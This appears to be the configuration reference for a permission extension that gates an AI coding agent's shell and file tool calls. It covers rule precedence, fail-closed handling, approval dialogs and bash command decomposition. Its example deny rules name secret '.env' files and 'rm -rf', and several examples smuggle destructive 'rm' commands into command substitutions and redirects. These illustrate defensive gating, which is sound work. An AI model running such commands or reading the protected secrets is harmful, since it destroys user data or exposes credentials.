# Configuration Reference

## Config File Locations

One unified config file per scope:

| Scope   | Path                                                                                       |
| ------- | ------------------------------------------------------------------------------------------ |
| Global  | `~/.pi/agent/extensions/pi-permission-system/config.json` (respects `PI_CODING_AGENT_DIR`) |
| Project | `<cwd>/.pi/extensions/pi-permission-system/config.json`                                    |

Project config overrides global config; per-agent frontmatter overrides both.

**Project config requires project trust.**
Project and project-agent scopes (both permission policy and runtime config such as `yoloMode`) are loaded only when Pi reports the project as trusted (`ctx.isProjectTrusted()`).
In an untrusted directory, only global (and global-agent) config applies, so an untrusted repository cannot loosen your global policy; the extension surfaces a loud warning plus a `project_trust.skipped` review-log entry when it skips a project scope.
Grant project trust (or configure `defaultProjectTrust`) to load the project's config; a trust grant reloads project policy on the next `resources_discover` reload.
See [migration/0644-project-trust-gating.md](migration/0644-project-trust-gating.md).

> **Coming from OpenCode?**
> This extension's permission model was inspired by OpenCode's.
> See [OpenCode Compatibility](opencode-compatibility.md) for shared concepts, divergences, and a porting guide.

<!-- -->

> **Tip:** All `~/.pi/agent` paths shown in this document are defaults.
> If the `PI_CODING_AGENT_DIR` environment variable is set, Pi uses that directory instead.

## Merge Precedence

**Precedence order (later wins):**

1. Global config file
2. Project config file
3. Global agent frontmatter
4. Project agent frontmatter

The `permission` object uses deep-shallow merge: string-vs-string replaces; both-object shallow-merges pattern maps; string-vs-object the override wins entirely.
Scalar fields (`debugLog`, `permissionReviewLog`, `yoloMode`, `doublePressToConfirm`, `forwardingTimeoutMs`, `promptTimeoutMs`, `promptMaxRows`, `promptFieldMaxWidth`) use simple replacement.
`permissionDialogKeys` replaces the whole map rather than merging entry by entry, so the map that was validated is the map that applies.
`promptNotifications` likewise replaces the whole list, so a project `[]` turns off a global list.

**Invalid higher-precedence scope fails closed.**
If a non-global scope (project config, global agent frontmatter, or project agent frontmatter) is present but fails to load or validate, it no longer contributes an empty scope that silently inherits the lower scope's rules.
Instead the effective policy is floored so nothing resolves more permissively than `ask`: every `allow` (including one inherited from a lower scope) is clamped to `ask`, while `deny` and `ask` are unchanged.
So a global `bash: allow` cannot remain effective behind a project scope that was meant to deny bash but contains a typo — bash prompts until the invalid config is fixed.
A validation warning plus a distinct fail-closed notice are emitted, and a fix + reload restores the intended policy.
An invalid **global** scope does not trigger the clamp — it is the lowest precedence, so nothing more permissive is inherited when it fails.
This clamp is deny-preserving and, like `yoloMode`, applied at composition; when `yoloMode` is on it re-permits the floored `ask` back to `allow`, since yolo is an explicit full-permissive opt-in.

## Full Example

```jsonc
{
  "$schema": "https://raw.githubusercontent.com/gotgenes/pi-packages/main/packages/pi-permission-system/schemas/permissions.schema.json",

  // Runtime knobs
  "debugLog": false,
  "permissionReviewLog": true,
  "yoloMode": false,
  "doublePressToConfirm": true,
  "forwardingTimeoutMs": 600000,
  // "promptTimeoutMs": 60000, // opt-in: deny a prompt nobody answers (unset = no timer)
  "piInfrastructureReadPaths": [],

  // Non-bash tools that carry shell semantics
  "shellTools": {
    "exec_command": { "commandArgument": "cmd", "workdirArgument": "workdir" }
  },

  // What your own bash commands do to the paths they are given
  "commandEffects": {
    "git": { "subcommands": { "log": "read", "status": "read" } }
  },

  // Ordered names of registered live-authority chain links (empty = none)
  "authorizerChain": [],

  // Flat permission policy
  "permission": {
    "*": "ask",                              // universal fallback
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    },
    "read": "allow",
    "write": "deny",
    "edit": "deny",
    "bash": {
      "git *": "ask",
      "git status": "allow",
      "npm *": { "action": "deny", "reason": "Use pnpm instead" }
    },
    "mcp": { "mcp_status": "allow" },
    "skill": { "*": "ask" },
    "external_directory": "ask"
  }
}
```

> **Note:** Trailing commas are **not** supported.
> If parsing fails, the extension falls back to `ask` for all categories.

## Runtime Knobs

| Key                         | Default  | Description                                                                                                                                                                                                                                  |
| --------------------------- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `debugLog`                  | `false`  | Enables verbose diagnostic logging to `logs/pi-permission-system-debug.jsonl`                                                                                                                                                                |
| `permissionReviewLog`       | `true`   | Enables the permission request/denial review log at `logs/pi-permission-system-permission-review.jsonl`. Records bash command strings, masked only where a name binds the secret — see [Log file sensitivity](#log-file-sensitivity)         |
| `yoloMode`                  | `false`  | Auto-approves `ask` results instead of prompting when yolo mode is enabled                                                                                                                                                                   |
| `doublePressToConfirm`      | `true`   | Requires a confirming second press of a decision hotkey in the inline TUI dialog (see below). TUI sessions only; set to `false` for single-press.                                                                                            |
| `permissionDialogKeys`      | —        | Remaps the inline TUI dialog's decision hotkeys (see below). One printable character per decision; omitted decisions keep `y` / `s` / `b` / `n` / `r`.                                                                                       |
| `promptNotifications`       | `[]`     | Terminal notifications to emit when the inline TUI dialog opens: `"bell"`, `"osc9"`, `"osc777"` (see below). Empty for none.                                                                                                                 |
| `forwardingTimeoutMs`       | `600000` | How long a subagent waits for the parent session to answer a forwarded permission request, in milliseconds. A child whose parent is not draining its inbox gives up in ~2 s regardless, whether that parent runs in this process or its own. |
| `promptTimeoutMs`           | —        | How long a permission prompt, once shown, waits for an answer before it is dismissed and the request denied, in milliseconds. Unset (the default) means no timer. See [Unanswered prompts](#unanswered-prompts).                             |
| `promptMaxRows`             | `24`     | Max rows a permission prompt renders before eliding its evidence. The request's own facts are never elided by this budget; `Ctrl+O` expands the prompt to the complete request.                                                              |
| `promptFieldMaxWidth`       | `400`    | Max characters of any one field shown in a permission prompt. This is what bounds a single long field (a here-string command, say) that would otherwise fill the prompt through wrapping.                                                    |
| `reviewLogFieldMaxWidth`    | `1000`   | Max characters of any one value written to the review log. A longer value is stored shortened, marked with an ellipsis. Raise it to keep longer values; this is a length bound, not redaction.                                               |
| `toolInputPreviewMaxLength` | —        | **Deprecated and ignored.** Superseded by `promptMaxRows` / `promptFieldMaxWidth`. Still accepted so an existing config is not rejected, but the value no longer applies; setting it logs a warning.                                         |
| `toolTextSummaryMaxLength`  | —        | **Deprecated and ignored.** Superseded by `promptMaxRows` / `promptFieldMaxWidth`. Still accepted so an existing config is not rejected, but the value no longer applies; setting it logs a warning.                                         |
| `piInfrastructureReadPaths` | `[]`     | Extra directories to auto-allow for reads, bypassing the `external_directory` gate. Supports `~`/`$HOME`/`${HOME}` expansion and wildcard patterns (`*`, `?`).                                                                               |
| `authorizerChain`           | `[]`     | Ordered names of registered live-authority chain links to consult before the terminal authorizer (see [Authorizer chain](#authorizer-chain--case-by-case-decision-links)).                                                                   |

Both logs write to `~/.pi/agent/extensions/pi-permission-system/logs/`.
No debug output is printed to the terminal.

### Inline permission dialog (TUI)

In an interactive **TUI** session, an `ask` decision opens an inline keybind dialog with one-key shortcuts:

| Key | Action                                                             |
| --- | ------------------------------------------------------------------ |
| `y` | Approve once                                                       |
| `s` | Approve for this session, in the direction the gate proved         |
| `p` | Approve and add an eligible exact command to the project allowlist |
| `g` | Approve and add an eligible exact command to the global allowlist  |
| `b` | Approve for this session in **both** directions (see below)        |
| `n` | Deny                                                               |
| `r` | Deny with a reason (opens an inline editor; a reason is required)  |

`b` appears only for an ask whose paths all prove the same direction — a read or a write, but not both.
The `p` and `g` options appear only for eligible commands, as described in [persistent command approval](#persistent-command-approval).
See [session-approvals.md](session-approvals.md#grant-direction) for what the two widths grant.

Arrow keys / `j`/`k` move the highlight, `enter` confirms the highlighted option, and `esc` denies.
With `doublePressToConfirm` enabled (the default), a hotkey **arms** its action and shows a `Press y again to approve.` hint; press the same key again to commit.
Set `doublePressToConfirm` to `false` to commit on the first press.

#### Remapping the hotkeys

Set `permissionDialogKeys` to bind any decision to a different key:

```jsonc
{
  "permissionDialogKeys": {
    "approve": "1",
    "approveSession": "2",
    "approveSessionBoth": "3",
    "approveProjectCommand": "6",
    "approveGlobalCommand": "7",
    "deny": "4",
    "denyWithReason": "5"
  }
}
```

The seven decision names above are the only keys the map accepts, and each is optional.
A decision you do not name keeps its default letter.

This exists for input method editors.
While an IME is composing — Chinese Pinyin or Wubi, Japanese, Korean — a letter keypress is consumed by the candidate buffer and never reaches the terminal, so `y` and `n` do nothing and the dialog looks frozen.
The usual way out of a candidate popup is `esc`, which *does* reach the terminal and which this dialog reads as a denial, so a call you meant to approve gets refused.
Digits are unaffected on essentially every layout, which is why `1`–`5` is the mapping to reach for.

Each value is a **single printable character**: a lowercase letter, a digit, or a symbol.
Three things are refused:

- `j` and `k`, which move the dialog's highlight — a decision bound to one would never fire.
- An uppercase letter.
  Pi lowercases a key identifier, so `"Y"` would answer to a lowercase `y` rather than to the keystroke you asked for.
- A character two decisions would share, including one a decision you did **not** remap already holds.
  Trading two decisions' keys is fine (`{"approve": "n", "deny": "y"}`), because neither keeps the other's.

A refused entry is a warning, never a policy event: that decision keeps its default letter, the rest of the map still applies, and your permission rules are untouched.
Named keys (`f1`, `pageUp`) and modifier combinations (`ctrl+g`) are not accepted.

One collision no check can see: if you rebind Pi's own `app.tools.expand` to a printable character that is also a dialog binding, expansion wins — the dialog offers that action first, before it maps a decision key.

Pi's tool-expansion binding (`app.tools.expand`, `Ctrl+O` by default) stays live while the dialog is open.
It expands both the prompt itself — to the complete request, unbounded by `promptMaxRows` and `promptFieldMaxWidth` — and the host's pending tool call, so one keystroke shows you everything before you decide.
It only toggles the display — it never resolves, commits, or arms the pending decision.
Because it is offered ahead of the decision keys, a printable rebinding of it shadows a `permissionDialogKeys` entry that names the same character.
While you are typing a denial reason it is not intercepted, so a rebound printable key still reaches the reason editor.

The reason editor is Pi's own line editor, so it behaves like the chat input: pasting works, as do cursor movement, word and line deletion, the kill ring, and undo.
The reason is a single line — a pasted line break becomes a space, and a long reason scrolls sideways rather than growing the dialog.
`enter` submits it, and `esc` (or `Ctrl+C`) returns to the decision list without denying.

#### Terminal notifications

An ask stops the agent mid-turn, so a session in a background tab or pane can sit waiting without anything telling you.
Set `promptNotifications` to have the dialog signal the terminal as it opens:

```jsonc
{
  "promptNotifications": ["bell", "osc777"]
}
```

| Channel    | Writes                                           |
| ---------- | ------------------------------------------------ |
| `"bell"`   | BEL, the terminal bell                           |
| `"osc9"`   | an OSC 9 desktop notification (`ESC ] 9 ;`)      |
| `"osc777"` | an OSC 777 desktop notification (`ESC ] 777 ;`)  |

The bell is the widest-supported signal: terminals and multiplexers already route it to a sound, a badge, or pane attention (tmux `monitor-bell`, for one).
The two OSC forms raise a desktop notification in terminals that implement them; which one yours supports is in its documentation, and listing both is harmless, since a terminal ignores an OSC it does not know.

Channels are written in the order listed.
The list is empty by default, so nothing is emitted until you set it; an unknown channel name is a validation error like any other malformed field.
The notification names the session and what is being asked, so it tells you which pane to go to.
Its title is `pi — <session name>`, or `pi — <directory name>` for a session without a name.
Its body is the dialog title followed by the tool (or, for an ask that is not a tool call, the gate surface) and the requesting agent when there is one:

| Ask                                         | `osc777` title       | `osc777` body                                  |
| ------------------------------------------- | -------------------- | ---------------------------------------------- |
| local `bash` ask in session `refactor-auth` | `pi — refactor-auth` | `Permission Required: bash`                    |
| `read` forwarded from subagent `scout`      | `pi — refactor-auth` | `Permission Required (Subagent): read (scout)` |

OSC 9 has a single text field, so `osc9` writes the title ahead of the body: `pi — refactor-auth: Permission Required: bash`.
The notification carries labels only, never the command, path, MCP target, or skill being decided, so nothing the request holds lands in your notification history.

The signal fires once per prompt, when the prompt is actually shown.
A second ask that waits behind an open dialog signals when its own turn comes, and a forwarded subagent ask signals in the parent session that shows it.
An ask decided without a dialog (by a rule, a session approval, or an authorizer link) emits nothing.
Only interactive TUI sessions signal; outside interactive mode Pi routes stdout away from the terminal, so there is nothing to ring.

Inside tmux, prefer `"bell"`: tmux passes a BEL through to its own bell handling, but drops OSC notifications unless passthrough is enabled.

To run a program instead (Herdr, `cmux notify`, a push to your phone), write a small extension on the `permissions:ui_prompt` and `permissions:decision` broadcasts; see the [recipe](cross-extension-api.md#recipe-bridging-a-prompt-to-an-external-notifier).

### Persistent command approval

This fork offers **Yes, add to project allowlist** and **Yes, add to global allowlist** in the RPC select dialog and the TUI.
Each option shows the complete exact command it will save; it does not shorten arguments or introduce a wildcard.
The choices are available only for local bash command asks that have no wrapper floor, nested/compound execution, shell expansion, redirection, wildcard characters, or unresolved parsing.
Forwarded and named-agent requests retain their existing once/session choices.

Project rules are written to `<cwd>/.pi/extensions/pi-permission-system/config.json` and are offered only in a trusted project.
Global rules are written to `~/.pi/agent/extensions/pi-permission-system/config.json` (respecting `PI_CODING_AGENT_DIR`).
Both use the existing `permission.bash` map and are read by subsequent calls and sessions without a reload.
Higher-precedence project or agent restrictions can still require approval for a global rule.
Path checks remain separate, and saving a command cannot replace a matching deny in the loaded global or project configuration.

Only an explicit human choice writes a rule; model approvals, single-use receipts, and ordinary once/session approval do not persist anything.
The writer validates the existing config, preserves unrelated settings, rejects symlinked targets, serializes cooperating writers with a lock, and replaces the file atomically.
If saving fails, the request remains unapproved and the prompt reports the failure; choosing approval once on a subsequent attempt does not require saving a rule.
The review log records `command_rule.saved` or `command_rule.save_failed` with the request ID and scope.
Remove a saved command from the corresponding `permission.bash` map to revoke it.

### Unanswered prompts

By default a permission prompt waits until someone answers it.
For a run you leave unattended, set `promptTimeoutMs` so a prompt nobody answers is denied instead of holding the agent indefinitely:

```jsonc
{
  "promptTimeoutMs": 60000
}
```

When the window expires, the prompt is dismissed and the request is **denied**; the timeout never approves anything.
The agent is told that nobody answered the approval prompt within the window, not that you refused it, so it can try another approach or carry on with other work.
The review log records the decision as `decidedBy: { "kind": "unanswered", "timeoutMs": 60000 }`, and the `permissions:decision` broadcast reports `prompt_unanswered`.

The clock starts when a prompt is shown, not when the request is raised.
A request waiting behind another open prompt gets its own full window once it is shown, so several unanswered requests take about one window each.
In the inline TUI dialog, the hint row names the window while it runs, and pressing any key stops the clock: once you start answering (moving the highlight, typing a denial reason), the dialog waits for you to finish.
The `select` fallback outside TUI mode has no keystroke to watch, so its window runs until you finish answering or it expires, and it spans the follow-up dialogs too: a window that expires while the grant-scope choice or the denial-reason input is open discards the half-made answer and denies the request as unanswered.

A request forwarded from a subagent is shown in the parent session, so the **parent's** `promptTimeoutMs` applies to it, and the subagent receives the same unanswered denial.
The subagent separately stops waiting after `forwardingTimeoutMs`; keep `promptTimeoutMs` below it, or the subagent can give up while the parent's prompt is still open.

### What a prompt shows

The prompt renders one fact per line, with the requesting agent (and, for a forwarded subagent ask, its session), the tool, the gate surface, the matched rule, the decision-relevant value, and — for a wrapper such as `xargs` — the command that will actually run.
Those facts are always present: a budget may shorten a long one, never drop it.
A fact the line above already states is not repeated — a bash ask shows `tool : bash` without a second `surface : bash` line, and a path ask's `path :` line names the surface itself.

Everything else is evidence — the full command a gated sub-command came from, the working directory a path escaped, the tool-input preview — and it is what gives way when the render does not fit.
A shortened field or a dropped entry is marked with an ellipsis, and `Ctrl+O` shows the complete request.
Raise `promptMaxRows` to see more evidence inline; raise `promptFieldMaxWidth` to see more of a long command.

Non-TUI contexts render the same facts under the same budget, without the colour or the expansion.

Non-TUI contexts (RPC / frontend-driven sessions) keep the single-select prompt and are unaffected by `doublePressToConfirm`.

### `piInfrastructureReadPaths` patterns

Each entry is either a plain directory prefix or a wildcard pattern.
Plain entries match any path that starts with the given directory (after `~`/`$HOME`/`${HOME}` expansion).
Wildcard entries use `*` (any characters, including `/`) and `?` (exactly one character).
`*` and `**` are equivalent — both cross directory boundaries.

Example — allow reads from a Homebrew-managed Pi install at any version:

```jsonc
{
  "piInfrastructureReadPaths": [
    "/opt/homebrew/**/@earendil-works/pi-coding-agent/**"
  ]
}
```

### `shellTools` — gating aliased shell tools

The native `bash` tool goes through the full bash enforcement stack: command decomposition, wrapper flooring, path and external-directory token gates, and `bash:` rules.
Some extensions replace `bash` with a differently-named tool — for example [`@howaboua/pi-codex-conversion`](https://github.com/IgorWarzocha/howaboua-pi-stuff) registers `exec_command`, which carries the shell command in a `cmd` argument and an optional working directory in `workdir`.
Without a hint, the permission system cannot tell that such a tool is really a shell, so it gates it as a generic extension tool and the bash rules never apply.

`shellTools` records that hint, and an aliased tool is then gated at full parity with native `bash` — command decomposition, wrapper flooring, path and external-directory token gates, and `bash:` rules — with the invoked tool name preserved in the review log.
Each key is a tool name; its value maps the tool's input arguments (the keys of the tool call's `arguments` object):

```jsonc
{
  "shellTools": {
    "exec_command": { "commandArgument": "cmd", "workdirArgument": "workdir" }
  }
}
```

| Field             | Required | Description                                                               |
| ----------------- | -------- | ------------------------------------------------------------------------- |
| `commandArgument` | yes      | The tool's input argument holding the shell command string (e.g. `cmd`).  |
| `workdirArgument` | no       | The tool's input argument holding the working directory (e.g. `workdir`). |

When `workdirArgument` is set, the tool's working directory is the base the command's relative paths resolve against, and the working directory itself is gated by `external_directory` when it falls outside the session's working directory.

Merge semantics: `shellTools` **shallow-merges by tool name** across global → project.
A project entry overrides a specific tool's mapping on a key collision but never drops a global entry — so adding a project-scoped alias cannot silently remove enforcement for a tool the global config already covers.
To change a specific tool's mapping, set that tool's key at the project scope (the alias object is replaced wholesale, not deep-merged).

`shellTools` only ever *tightens* enforcement and is inert when the named tool is not registered in the current session.
Opting a project out of a shell-aliasing extension is a package-disable concern, not a `shellTools` edit.

### Authorizer chain — case-by-case decision links

The deterministic policy above decides `allow` / `deny` / `ask` for every request.
When a request lands on `ask`, the **authorizer chain** decides who answers it.
By default that is you (an interactive prompt), the subagent-forwarding path, or a headless deny.
A downstream extension can register a **link** — a reviewer that sees the `ask` and returns `allow`, `deny` (with an optional teaching reason), or `defer` to the next link — and the chain ends at the default terminal that always decides.
The canonical use case is a light model judge that reviews asks case by case (e.g. auto-denying an errant typo-path with a corrective reason).

`authorizerChain` is the ordered list of link names to consult, ahead of the terminal:

```jsonc
{
  "authorizerChain": ["model-judge"]
}
```

Three invariants govern the chain:

1. **Config order wins, never registration order.**
   The order in `authorizerChain` — not the order extensions happen to register in — fixes the security-relevant chain order.
2. **A missing link is skipped fail-safe, and you are told.**
   A name with no registered link is skipped; the `ask` still reaches the terminal.
   Absence of a judge means *more* prompting, never less.
   Because you asked for that judge and did not get it, the skip also raises a warning naming the link — once per session per name, beside the per-ask review record.
   Three things leave the identical absence, so the warning names the likeliest and admits the others: the extension providing the link is not loaded in this session (a subagent child's `excludedExtensionPackages` does this), it failed to load, or it declined to register because it has no configuration of its own.
3. **Registration alone grants no authority.**
   Installing a judge extension gives it nothing; a link decides nothing until you name it here (opt-in activation).

The chain owner caps every link with a **bounded-delegation checkpoint**: a link's `allow` on an excluded surface *family* (`external_directory` or `path`, including each family's directional members) is downgraded to `defer`, so a buggy or over-eager judge can never approve access outside your policy.
Deny and defer are never capped.
The excluded surface is the **gate** surface the rule fired on, not the tool name displayed in the prompt — so a `write` blocked by a `path` rule is capped.
This holds for an ask forwarded up from a subagent exactly as it does for a local one.
See [migration/0635-forwarded-ask-delegation-envelope.md](migration/0635-forwarded-ask-delegation-envelope.md).

One exception is granted per ask, never per family: the **nothing-on-disk license**.
A bash command's `external_directory` ask carries it when the command reads verbatim (it parses without error recovery, so an extglob such as `@(etc|var)` does not, and holds no backslash-newline) and every path the ask flags is a whole word spelled as the absolute path it names (bounded by an unescaped space, tab, newline, or operator, no relative spelling, no `.` or `..` segment, no glob, brace, `$` expansion, command substitution, or escape), names nothing on disk below the filesystem root (the root itself does not qualify), and is not a proven write (an output redirect, or a `commandEffects` writer).
That is the shape of a token that only looks like a path, such as the spreadsheet cell in `officecli set data.xlsx /Sheet1/B1`.
A link's `allow` on a licensed ask is honored, and the review log records `authorizer_allow_licensed` naming the link; one flagged path that exists, or sits under an existing directory, withholds the license from the whole ask.
A tool's ask (`write`, `edit`, an extension tool) never carries it, and the `path` family takes no license.
See [migration/0882-nothing-on-disk-delegation-license.md](migration/0882-nothing-on-disk-delegation-license.md).

When a **subagent** raises the ask, the chain runs one hop up.
The subagent forwards the request to the session serving it, and that session resolves it against its own rules and then runs *its* chain over the same evidence — so your configured links do review a subagent's asks, in the session you are watching.
The subagent itself resolves no links (an extension cannot register one in a child session at all), and records `authorizer_chain_delegated` in the review log to say so.

These review-log records make the chain observable, all keyed by the ask's `requestId`:

| Record                               | Meaning                                                                                                                                                |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `authorizer_chain_resolved`          | the links consulted on this ask, recorded before they run — a link that defers otherwise leaves no trace                                               |
| `authorizer_chain_delegated`         | the ask came from a relaying subagent node; the named links were deliberately not run here                                                             |
| `authorizer_chain_unregistered_link` | a configured name had no registered link — a real misconfiguration; the ask still reaches the terminal, and the first skip of that name also warns you |
| `authorizer_allow_licensed`          | a link's `allow` on an `external_directory` ask was honored because the ask carried the nothing-on-disk license; names the `link` and the `license`    |
| `authorizer_link_vacant`             | a link was registered on a relaying node, which runs no chain — accepted and recorded, never consulted                                                 |

Extension authors: register a link from a `permissions:ready` handler via `getPermissionsService(sessionId).registerAuthorizer(name, authorize)`, taking `sessionId` from that event's payload; the callback receives the ask details and a narrow, session-scoped `PermissionQuery` (`checkPermission` / `getToolPermission`) so it can consult the deterministic engine at gate parity.
The details' `accessIntent` carries the gate surface the rule fired on and, on a licensed bash `external_directory` ask, `delegationLicense: "nothing-on-disk"`; a link that allows only what the checkpoint will honor can read it before calling a model.
Registration returns a disposer, and only one link may hold a given name.
Register in every session without branching: a session that relays its asks accepts the link and records `authorizer_link_vacant` rather than refusing it.
For a complete working example, see [`@gotgenes/pi-permission-model-judge`](https://github.com/gotgenes/pi-packages/tree/main/packages/pi-permission-model-judge): it registers a `model-judge` link on `permissions:ready` that reviews `external_directory` asks and auto-denies mistyped paths with a corrective reason.

---

## Policy Reference

### `permission["*"]` — Universal Fallback

The `"*"` key sets the action used when no surface-specific rule matches:

```jsonc
{
  "permission": {
    "*": "ask"
  }
}
```

Omitting `"*"` defaults to `"ask"` (least privilege).

### Tool Surfaces

Any registered tool name can be a surface key.
A string value is a catch-all for that surface.

| Surface example                               | Description                                                 |
| --------------------------------------------- | ----------------------------------------------------------- |
| `read`, `write`, `edit`, `grep`, `find`, `ls` | Canonical Pi built-in file tools                            |
| `bash`                                        | Shell command execution                                     |
| `mcp`                                         | MCP calls: Pi's built-in MCP tools and the `mcp` proxy tool |
| `task`                                        | Delegation tool                                             |
| `third_party_tool`                            | Any other registered extension tool                         |

```jsonc
{
  "permission": {
    "read": "allow",
    "write": "deny",
    "third_party_tool": "ask"
  }
}
```

Unknown or absent tools are not required in the config.
If a tool is not registered at runtime, this extension blocks it before permission checks run.

A tool is withheld from the model entirely only when **every** pattern configured under its surface resolves to `deny`.
So `"bash": "deny"` hides the tool, while `"bash": { "*": "deny", "git *": "ask" }` keeps it visible — the agent can attempt a `git` command and be prompted, and everything else is denied at the gate.
Ordering follows the same last-match-wins rule as every other lookup: an exception written *after* the `deny` catch-all is reachable, while one written *before* it is shadowed and the tool is hidden.

#### Path Patterns for File Tools

For path-bearing tools (`read`, `write`, `edit`, `find`, `grep`, `ls`), an object value maps file-path patterns to actions.
Patterns are matched against `input.path` using the same last-match-wins wildcard semantics as bash command patterns.
When Pi's current working directory is known, a relative path input is matched with both its original relative form and its cwd-normalized absolute form, so an absolute allowlist rule and a legacy relative rule can both apply to the same file.
Per-tool path patterns also match the canonical (symlink-resolved) form, at parity with the `path` surface, so a per-tool deny on a sensitive spelling cannot be evaded through a symlink alias (see Symlinked paths below).
`*` matches zero or more of any character **including** path separators — `src/*` matches both `src/foo.ts` and `src/deep/nested/foo.ts`.
There is no single-segment vs. multi-segment distinction; `**` is not a supported token and behaves identically to `*`.

```jsonc
{
  "permission": {
    "read": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    },
    "write": {
      "*": "deny",
      "src/*": "allow",
      "tests/*": "allow"
    },
    "edit": {
      "*": "ask",
      "*.lock": "deny"
    }
  }
}
```

String shorthand is still supported and behaves identically — `"read": "allow"` is equivalent to `"read": { "*": "allow" }`, which permits reads of any path.

Tool injection at agent start is unaffected: a config like `"read": { "*": "allow", "*.env": "deny" }` still exposes the `read` tool to the agent.
Only specific paths are restricted at call time.

### `bash` Surface

Command patterns use wildcards matched against each top-level command in the chain:

- `*` matches zero or more of any character (including `/` and other separators — there is no single-segment vs. multi-segment distinction; `**` is not a supported token and is equivalent to `*`).
- `?` matches exactly one character.

**Last matching rule wins** within a single command — put broad catch-alls first, specific overrides after.

A bash invocation may be a chain of commands joined by `&&`, `||`, `;`, `|`, `&`, or newlines.
Each top-level command is evaluated independently against the patterns, and the most restrictive result wins (`deny` > `ask` > `allow`).
So `cd /repo && npm install x` evaluates both `cd /repo` and `npm install x`; if `npm *` is denied, the whole invocation is denied even when `cd *` is allowed.

Quotes are respected (an operator inside `'…'` or `"…"` does not split the command).
Commands nested inside command substitution (`$(…)`, backticks), process substitution (`<(…)`/`>(…)`), and subshells (`( … )`) are evaluated against the bash patterns too, in addition to their enclosing command — since those inner commands really execute.
So `echo $(rm -rf foo)` evaluates both `echo $(rm -rf foo)` and the inner `rm -rf foo`; if `rm *` is denied, the whole invocation is denied.
The deny reason and the approval prompt note the nested origin (e.g. `inside command substitution`).

This holds wherever the substitution appears, not only in argument position.
A substitution in a **redirect target** (`echo hi > $(rm *.txt)`, `cat < <(rm c)`, ``echo hi 2> `rm d` ``) and one in an **interpolating heredoc body** (`cat <<EOF` with `$(rm e)` in the body) are evaluated the same way.
A quoted heredoc delimiter (`<<'EOF'` or `<<"EOF"`) does not interpolate, so its body is literal text and nothing in it is evaluated as a command.
The enclosing command is still matched without its redirect, so a rule like `npm install` keeps matching `npm install > out.txt`.
Control-flow bodies (`if`/`while`/`for`/`case`) and `{ … }` brace groups are not descended into; their contents are matched as part of the enclosing statement's text.

A command that starts with `~`, `$HOME`, or `${HOME}` also matches a home-anchored pattern spelled any of those ways, or with the absolute home directory (see [Home Directory Expansion in Patterns](#home-directory-expansion-in-patterns)).

A path argument also matches in its absolute spelling.
Each command is matched as typed and with every path argument replaced by the absolute path it resolves to, against the working directory a literal `cd` earlier in the chain moved to.
The last rule matching either text wins, as for any other pattern.

```jsonc
{
  "permission": {
    "bash": {
      "*": "allow",
      "rm *": "ask",
      "rm /tmp/agent-builds/*": "allow"
    }
  }
}
```

With this policy, `cd /tmp && rm agent-builds/x` runs, because `rm agent-builds/x` is also matched as `rm /tmp/agent-builds/x`.
An absolute `deny` reaches the relative spelling the same way.
An absolute `allow` written *before* the broader `ask` still loses to it.

Some arguments get no absolute spelling and are matched as typed only:

- an argument after a `cd` whose target is not literal (`cd "$DIR"`, `cd -`, a bare `cd`), since the directory is not known;
- an argument holding a glob (`*`, `?`, `[`), quoted or not;
- an argument a variable or substitution computes (`$DIR/x`, `$(pwd)/x`);
- a bare name such as `config.json` that names nothing on disk;
- a POSIX absolute path on Windows (`/tmp/x`), which is kept as typed.

The absolute spelling replaces every path argument of a command at once, and it is separate from the home spelling above.
A rule naming one argument absolute and another relative, or naming both the expanded home and an absolute argument, matches neither text.
A quoted argument is spelled without its quotes (`rm "a b/c"` is also matched as `rm /tmp/a b/c`).
Whether an argument is a path is decided by its shape, so a slash-bearing word that is not one is spelled too: `git push origin feature/x` is also matched as `git push origin <cwd>/feature/x`, which only a rule naming that absolute form would match.
When the spelling is what a rule matched, the prompt shows it on a `matched as` line beside the rule, and the review log records it as `matchedSpelling`.
A session approval still records the command as typed, so approving `rm agent-builds/x` does not cover a later `rm /tmp/agent-builds/x`.

A leading environment-variable assignment prefix is stripped before matching, so the rule gates the underlying command rather than the prefix.
So `AWS_PROFILE=prod aws ec2 …` is matched as `aws ec2 …` — a `aws *` rule applies even though the invocation begins with `AWS_PROFILE=`.
Prefixes like `PGPASSWORD=` and `KUBECONFIG=` are handled the same way.

A pattern ending with `*` (space + wildcard) also matches the bare command without arguments.
For example, `"git *"` matches both `"git status"` and bare `"git"`.
Place a more specific pattern *after* it to carve out exceptions — the later matching rule wins.

> **Patterns match individual commands, not whole chains.**
> A pattern that embeds a chain operator (e.g. `"cd * && npm *"`) will not match, because each command in the chain is evaluated separately.
> Write one pattern per command instead.

```jsonc
{
  "permission": {
    "bash": {
      "*": "ask",
      "git *": "ask",
      "git status": "allow",
      "git diff": "allow",
      "rm -rf *": "deny",
      "npm *": { "action": "deny", "reason": "Use pnpm instead" }
    }
  }
}
```

String shorthand sets a catch-all for all bash commands:

```jsonc
{
  "permission": { "bash": "allow" }
}
```

#### Deny with a Custom Reason

In any pattern map, a `deny` value may be written as an object with an optional `reason` instead of the plain `"deny"` string:

```jsonc
{
  "permission": {
    "bash": {
      "npm *": { "action": "deny", "reason": "Use pnpm instead" }
    }
  }
}
```

The reason is appended to the block message shown to the agent, so it learns why the command was denied and what to do instead:

```text
[pi-permission-system] is not permitted to run 'bash' command 'npm install' (matched 'npm *'). Reason: Use pnpm instead.
```

The object form is only valid at the pattern-value level (inside a pattern map) and only for `deny` — `action` must be `"deny"`, and `reason` must be a string (a non-string reason is ignored).
A bare `"deny"` string is unchanged and carries no reason.

#### Fail-closed behavior

The bash gate fails closed: when in doubt it blocks or prompts, never silently allows.

- If the permission gate throws an internal error (for example a transient tree-sitter parser-init failure), the tool call is **blocked** rather than passed ungated, and a `gate_error` entry is written to the review log naming the failure.
- A non-empty command that cannot be parsed into command units resolves to **`ask`** (the synthetic `<unparseable-bash-command>` pattern in the review log) instead of falling through to a permissive top-level `*`.
  A `deny` rule covering the whole command still denies outright — the synthetic `ask` never masks a hard deny into an approvable prompt.
  That whole-command check runs whenever the parse itself matched nothing, including when the recovery below went on to recover a command from the wreckage, so a rule naming the command in context (`"* rm -rf *"`) is still consulted.
  An empty, whitespace-only, or comment-only command has nothing to gate and is resolved normally.
